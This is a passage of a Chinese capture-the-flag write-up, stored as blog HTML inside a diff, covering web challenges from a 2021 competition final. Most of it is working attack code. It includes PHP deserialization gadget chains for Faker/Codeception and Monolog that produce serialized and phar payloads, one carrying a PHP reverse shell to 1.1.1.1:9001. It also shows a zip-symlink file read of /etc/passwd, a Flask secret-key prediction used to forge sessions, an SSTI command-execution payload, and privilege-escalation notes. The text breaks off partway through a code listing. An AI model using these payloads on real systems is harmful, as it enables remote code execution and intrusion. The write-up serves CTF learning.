<span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $generator;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$command,$argv</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> DefaultGenerator($argv);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">ValidGenerator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes = [] ;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$command,$argv</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[] = <span class="keyword">new</span> ValidGenerator($command,$argv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line">    $exp = <span class="keyword">new</span> RunProcess(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(urlencode(base64_encode(serialize($exp))));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>远程不通  麻了</p>
+<p>看到</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210911120635937.png" alt="image-20210911120635937"></p>
+<p>用phpggc第一条链子 本地测试可用 没有disable_function php反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Monolog</span>\<span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">SyslogUdpHandler</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">socket</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;socket = $x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BufferHandler</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $bufferSize = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $buffer;</span><br><span class="line">        <span class="comment"># ($record[&#x27;level&#x27;] &lt; $this-&gt;level) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $level = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> $initialized = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment"># ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $bufferLimit = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $processors;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$methods, $command</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processors = $methods;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = [$command];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">function</span> = &quot;<span class="title">system</span>&quot;;</span><br><span class="line">    $parameter = <span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,9001);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>;</span><br><span class="line">    $obj = <span class="keyword">new</span> \Monolog\Handler\SyslogUdpHandler(</span><br><span class="line">            <span class="keyword">new</span> \Monolog\Handler\BufferHandler(</span><br><span class="line">                [<span class="string">&#x27;current&#x27;</span>, $function],</span><br><span class="line">                [$parameter, <span class="string">&#x27;level&#x27;</span> =&gt; <span class="literal">null</span>]</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($obj));</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;poc.phar&quot;</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    $phar-&gt;setMetadata($obj); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><h3 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h3><p>HCTF 2018 Hide and seek</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d20168da7284">https://www.jianshu.com/p/d20168da7284</a></p>
+<p>上传zip利用软链接读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 1.txt</span><br><span class="line">zip -y 1.txt 1.zip</span><br></pre></td></tr></table></figure>
+
+<p>正常应该读取/proc/self/environ的 但是buu的读不了</p>
+<p>/app/uwsgi.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module &#x3D; main</span><br><span class="line">callable &#x3D; app</span><br></pre></td></tr></table></figure>
+
+<p>/app/main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    version = <span class="string">&quot;&#123;&#125;.&#123;&#125;&quot;</span>.format(sys.version_info.major, sys.version_info.minor)</span><br><span class="line">    message = <span class="string">&quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;</span>.format(</span><br><span class="line">        version</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>好像没啥用 不知道这个路径咋找的</p>
+<p>读/app/y0u_found_it/y0u_found_it_main.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到 用网卡mac地址作为种子 限定种子生成随机数一定是一样的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+
+<p>读/sys/class/net/eth0/address生成随机数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;02:42:ac:10:a9:e0&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [bin(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = int(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure>
+
+<p>然后伪造session就行</p>
+<h3 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h3><p>404 ssti 参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe">https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe</a></p>
+<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/07/22/ciscn2021_easypython/">https://inhann.top/2021/07/22/ciscn2021_easypython/</a></p>
+<p>题目代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,redirect,abort,render_template,render_template_string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&quot;\&#123;\&#123;.*request.*\&#125;\&#125;&quot;</span>,<span class="string">&quot;\&#123;\&#123;.*%.*\&#125;\&#125;&quot;</span>,<span class="string">&quot;\&#123;\&#123;.*\..*\&#125;\&#125;&quot;</span>,<span class="string">&quot;\&#123;\&#123;.*join.*\&#125;\&#125;&quot;</span>,<span class="string">&quot;\&#123;\&#123;.*\d.*\&#125;\&#125;&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> re.search(i,error.description):</span><br><span class="line">            <span class="keyword">return</span> render_template_string(render_template(<span class="string">&quot;404.html&quot;</span>,uri=<span class="string">&quot;nonono&quot;</span>+i)), <span class="number">404</span></span><br><span class="line">    sys.modules[<span class="string">&quot;subprocess&quot;</span>] = <span class="string">&quot;subprocess gone&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(render_template(<span class="string">&quot;404.html&quot;</span>,uri=error.description)), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&lt;uri&gt;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_here</span>(<span class="params">uri</span>):</span></span><br><span class="line">    abort(<span class="number">404</span>,uri)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>,debug=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>不懂 挺麻烦的 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25set%20z%3Drequest.args%25%7D%7B%25print(x.__init__.__globals__%5Bz.a%5D.eval(z.b))%25%7D?a&#x3D;__builtins__&amp;b&#x3D;__import__(&quot;imp&quot;).load_source(&#39;mymod&#39;, &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;subprocess.py&#39;).Popen(&quot;cat hint.txt&quot;,shell&#x3D;True,stdout&#x3D;-1).stdout.read()</span><br></pre></td></tr></table></figure>
+
+<p>解码就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set z&#x3D;request.args%&#125;&#123;%print(x.__init__.__globals__[z.a].eval(z.b))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着就是提权 sudo -l列出目前用户可执行与无法执行的指令</p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902171929905.png" alt="image-20210902171929905"></p>
+<p>/home/dragon_lord/Wait_3_years</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Just wait 3 years, my lord&#x27;</span></span><br><span class="line">sleep 94608000</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Three years has come.&#x27;</span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>貌似没啥用 /usr/sbin/service</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span 